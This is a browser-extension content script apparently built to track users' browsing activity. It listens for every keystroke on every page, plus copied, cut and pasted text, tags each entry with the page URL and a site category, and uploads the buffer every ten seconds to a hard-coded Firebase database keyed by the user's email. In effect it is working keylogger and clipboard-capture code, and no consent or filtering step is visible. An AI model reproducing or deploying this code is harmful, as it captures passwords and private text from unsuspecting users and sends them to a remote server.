
var config = {
  apiKey: "AIzaSyDp8BOChOi_zaguCrDg8D_YP1NLHAlA_V0",
  authDomain: "test-be1cc.firebaseapp.com",
  databaseURL: "https://test-be1cc.firebaseio.com",
  projectId: "test-be1cc",
  storageBucket: "gs://test-be1cc.appspot.com",
  messagingSenderId: "1047082222814",
  appId: "1:1047082222814:web:4c0a9ff088bacca55eee4f",
  measurementId: "G-0392Q4KEVX"
};

firebase.initializeApp(config);

toBeUpdated = false;
clipboardUpdate = false;
var clipboardText = "";
var bufferData = {};
var userEmail = "default";

chrome.extension.sendRequest({message: "letsgo"});
chrome.runtime.onMessage.addListener(
 function(request, sender) {
   userEmail = request.message;
   var link = document.getElementById('head');
   if(link){
     link.innerHTML = userEmail;
   }
  // alert("Contentscript has received a message from from background script: '" + request.message + "'");
  });


function writeUserData(bufferData) {
  userid = userEmail.split("@")[0];
  userid = userid.replace(/[&\/\\#,+()$~%.'":*?<>{}]/g,'_');
  alert(userid);
  firebase.database().ref('users/').child(userid).update(bufferData);
  toBeUpdated = false;
}



document.addEventListener("keydown",function(event){
  console.log(event.key);
  toBeUpdated = true;
  let hostname = getUrl();
  let activity = checkActivity(hostname);
  let epochTime = (new Date).getTime();
  bufferData[epochTime] = {"key":event.key,"url":hostname,"activity": activity, "clipboard":clipboardText };

});


function getUrl(){
	let url = window.location.href;
	return url;
}

function checkActivity(hostname){
	let qnahostnames = ["www.quora.com","stackoverflow.com","www.reddit.com","meta.stackoverflow.com","www.codeproject.com","groups.google.com","programmersheaven.com"];
	let codehostnames = ["colab.research.google.com"];
  let videohostnames = ["www.youtube.com"];

	if (qnahostnames.includes(hostname))
		return "Q&A";
	else if (codehostnames.includes(hostname))
		return "code";
	else if (videohostnames.includes(hostname))
		return "video";
	else
    return "search";
}


setInterval(function(){
  if(toBeUpdated) {
    toBeUpdated = false;
    writeUserData(bufferData);
    bufferData = {};
    clipboardText = "";
  }
}, 10000);


function geSelectionText(){
  let selectedText = "";
  if(window.getSelection){
  selectedText = window.getSelection().toString();
  }
  return selectedText;
}


document.addEventListener('copy',function(){
let text = geSelectionText();
if(text.length>0){
  clipboardText = text;
  console.log("Copied text",text);
}
},false)


document.addEventListener('cut',function(){
let text = geSelectionText();
if(text.length>0){
  clipboardText = text;
  console.log("This is cut text",text);
}
},false)
  

document.addEventListener('paste',function(e){
let data = e.clipboardData.getData('Text');
  clipboardText = data;
console.log("clipboardData",data);
});

